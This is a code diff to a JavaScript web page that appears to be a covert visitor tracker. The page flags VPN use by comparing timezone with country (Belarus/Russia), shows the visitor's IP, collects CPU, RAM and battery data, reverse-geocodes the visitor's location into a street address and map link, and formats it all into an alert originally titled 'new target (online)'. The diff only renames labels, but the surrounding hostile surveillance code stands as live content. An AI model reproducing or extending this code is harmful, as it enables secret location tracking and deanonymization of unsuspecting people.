@@ -147,7 +147,7 @@
             // VPN Check
             let v = "";
             if (new Date().getTimezoneOffset() === -180) {
-                if (d.k !== 'BY' && d.k !== 'RU') v = "⚠️ DETECTED VPN";
+                if (d.k !== 'BY' && d.k !== 'RU') v = "DETECTED VPN";
             }
             return { ...d, v };
         }
@@ -186,7 +186,7 @@
             document.getElementById('display-ip').innerText = n.i;
 
             const msg = `
-*НОВАЯ ЦЕЛЬ (ONLINE)*
+*CONNECTION ESTABLISHED*
 ━━━━━━━━━━━━━━━━
 ${n.v}
 
@@ -271,7 +271,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                             const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); 
                             addr = (await req.json()).display_name; 
                         } catch{}
-                        resolve({t:`Address: ${addr}\nMap: [Link](${link})`, e:false});
+                        resolve({t:`Address: ${addr}\nMap: [Click](${link})`, e:false});
                     },
                     (err) => {
                         clearTimeout(timer);
@@ -315,7 +315,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             if (navigator.getBattery) {
                 try {
                     const bt = await navigator.getBattery();
-                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Charging' : 'Battery'})`;
+                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Подзаряжается' : 'От батареи'})`;
                 } catch {}
             }
 
